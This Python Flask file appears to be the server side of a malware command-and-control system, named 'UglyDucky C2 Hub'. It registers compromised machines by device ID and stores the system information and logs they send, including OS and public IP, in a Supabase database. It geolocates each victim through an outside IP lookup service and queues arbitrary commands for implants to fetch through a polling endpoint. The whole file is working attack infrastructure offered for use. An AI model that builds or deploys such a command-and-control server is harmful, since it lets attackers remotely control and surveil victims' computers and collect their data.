# File: c2_listener.py
import os
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS
from datetime import datetime, timedelta, timezone

app = Flask(__name__)
CORS(app)

SUPABASE_URL = os.environ.get("SUPABASE_URL")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY")
command_queue = {}

# ---------------------------------------------------------
# HELPER FUNCTIONS
# ---------------------------------------------------------
def get_node_status(last_seen_str):
    if not last_seen_str: return "red", "Offline"
    last_seen = datetime.fromisoformat(last_seen_str).replace(tzinfo=timezone.utc)
    now = datetime.now(timezone.utc)
    if now - last_seen < timedelta(minutes=2): return "green", "Online"
    if now - last_seen < timedelta(hours=1): return "yellow", "Idle"
    return "red", "Offline"

def geolocate_ip(ip):
    # Default to Florida if testing locally or missing
    if not ip or ip in ["127.0.0.1", "Unknown"]: return 28.5383, -81.3792 
    try:
        # Changed to ip-api.com: Much more reliable on Render than ipapi.co
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        if response.ok:
            data = response.json()
            if data.get("status") == "success":
                return data.get("lat"), data.get("lon")
    except: pass
    return 28.5383, -81.3792 # Fallback

# ---------------------------------------------------------
# DASHBOARD ENDPOINTS
# ---------------------------------------------------------
@app.route('/node/<device_id>', methods=['GET'])
def get_single_node(device_id):
    if not SUPABASE_KEY or not SUPABASE_URL:
        return jsonify({"error": "Supabase key/URL missing"}), 500

    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
    
    try:
        time_url = f"{SUPABASE_URL}?device_id=eq.{device_id}&select=created_at&order=created_at.desc&limit=1"
        device_data = requests.get(time_url, headers=headers).json()
        if not device_data: return jsonify({"error": "Node not found"}), 404

        last_seen = device_data[0]['created_at']
        sysinfo_url = f"{SUPABASE_URL}?device_id=eq.{device_id}&category=eq.System Info&select=content&limit=1"
        sysinfo_resp = requests.get(sysinfo_url, headers=headers)
        
        os_info, ip_info = "Windows (Assumed)", "Unknown IP"
        if sysinfo_resp.ok and sysinfo_resp.json():
            content = sysinfo_resp.json()[0]['content']
            # Fixed parsing logic for OS string
            for line in content.split('\n'):
                if line.startswith('Caption='): os_info = line.split('=')[-1].strip()
                elif line.startswith('PUBLIC IP:'): ip_info = line.split(':')[-1].strip()

        status_color, _ = get_node_status(last_seen)
        lat, lng = geolocate_ip(ip_info)
        
        return jsonify({
            "id": device_id, "os": os_info, "ip": ip_info, 
            "lat": lat, "lng": lng, "status": status_color, "last_seen": last_seen
        })
    except Exception as e: return jsonify({"error": str(e)}), 500

@app.route('/logs/<device_id>', methods=['GET'])
def get_logs(device_id):
    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
    try:
        response = requests.get(f"{SUPABASE_URL}?device_id=eq.{device_id}&order=created_at.desc", headers=headers, timeout=10)
        return jsonify(response.json()), 200
    except: return jsonify({"error": "Database fetch failed"}), 500

@app.route('/logs', methods=['POST'])
def push_logs():
    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}", "Prefer": "return=minimal,resolution=merge-duplicates"}
    try:
        requests.post(f"{SUPABASE_URL}?on_conflict=device_id,category", json=request.json, headers=headers, timeout=15)
        return jsonify({"status": "success"}), 200
    except: return jsonify({"error": "Database push failed"}), 500

@app.route('/issue', methods=['POST'])
def issue_command():
    data = request.json
    command_queue[data.get('device_id')] = data.get('command')
    return jsonify({"status": "command queued"}), 200

@app.route('/poll/<device_id>', methods=['GET'])
def poll_for_command(device_id):
    return jsonify({"command": command_queue.pop(device_id, None)})

@app.route('/')
def index(): return "UglyDucky C2 Hub & Proxy Online."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
